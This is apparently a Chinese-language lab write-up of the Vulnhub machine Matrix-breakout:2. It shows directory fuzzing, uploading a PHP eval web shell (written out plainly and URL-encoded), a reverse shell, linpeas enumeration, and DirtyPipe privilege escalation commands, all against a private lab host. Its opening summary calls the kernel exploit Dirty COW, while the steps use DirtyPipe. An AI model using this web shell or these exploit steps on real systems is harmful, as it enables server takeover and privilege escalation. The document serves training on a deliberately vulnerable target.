---

title: Vulnhub--Matrix-breakout:2
categories: [渗透靶场, Vulnhub]

---

## **渗透复现**

1. web站点文件上传实现上马
2. 反弹shell后进行常规的信息收集（suid，sudo，用户信息）
3. 在无可用信息情况下，利用linux本地提权脚本linpeas进行本地漏洞的检测
4. 内核漏洞脏牛提权

## **知识扩展**

1. linux本地漏洞检测脚本工具linpeas

## 靶机地址

https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/

## 主机发现

（1）攻击机

```py
192.168.186.135
```

（2）目标靶机

```py
192.168.186.165
```

## 信息收集

### 端口扫描

![image-20240828101731798](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281017924.png)

### 目录扫描

![image-20240828101746679](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281017790.png)

### 目录爆破

```python
#常规目录扫描没有发现有用信息，进行FUZZ目录爆破，针对常见的文件后缀
ffuf -u http://192.168.229.136/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -ic -e .txt,.zip,.php,html
```

![image-20240828101801962](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281018079.png)

### 目录访问

（1）80端口

![image-20240828101814132](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281018190.png)

（2）81端口

![image-20240828101822769](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281018818.png)

（3）源码查看

![image-20240828101829178](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281018222.png)

（4）rotbots.txt查看

![image-20240828101834930](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281018971.png)

（5）javascript查看

![image-20240828101841723](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281018766.png)

（6）graffiti.txt查看

![image-20240828101848572](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281018614.png)

（7）graffiti.php查看

![image-20240828101854163](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281018208.png)

## 实施攻击

（1）POST框，进行简单测试，内容输入有回显

![image-20240828101900472](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281019516.png)

（2）BP抓包，发现是文件上传功能点

![image-20240828101905703](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281019759.png)

![image-20240828101912763](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281019820.png)

（3）尝试上马，修改后缀为PHP

```python
<?php @eval($_POST['123']);?>
#进行URl编码
%3c%3fphp+%40eval(%24_POST%5b%27123%27%5d)%3b%3f%3e
```

![image-20240828101920394](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281019441.png)

（4）放包，访问，上传成功

![image-20240828101927344](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281019387.png)

（5）蚁剑连接

![image-20240828101936939](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281019992.png)

（6）反弹shell

![image-20240828101942728](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281019798.png)

## 提权

（1）信息收集，收集SUID文件和用户信息，并无可用信息，尝试另法提权

![image-20240828101955411](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281019511.png)

![image-20240828102006008](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281020111.png)

（2）linpeas脚本进行本地信息收集

```py
#下载sh文件
https://github.com/peass-ng/PEASS-ng/releases
```

![image-20240828102018932](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281020989.png)

（3）将脚本复制到kali，并且kali启动http服务

![image-20240828102031860](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281020927.png)

（4）靶机获取sh文件

![image-20240828102040417](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281020511.png)

（5）赋予脚本权限，运行脚本,等脚本跑完后回到上面，即可找到本地可利用漏洞

```py
chmod +x linpeas.sh
./linpeas.sh
```

![image-20240828102050346](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281020432.png)

（6）搜索[CVE-2022-0847] DirtyPipe的提权操作，提权成功

```py
git clone https://github.com/imfiver/CVE-2022-0847.git
cd CVE-2022-0847
chmod +x Dirty-Pipe.sh
bash Dirty-Pipe.sh
```

![image-20240828102057903](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281020999.png)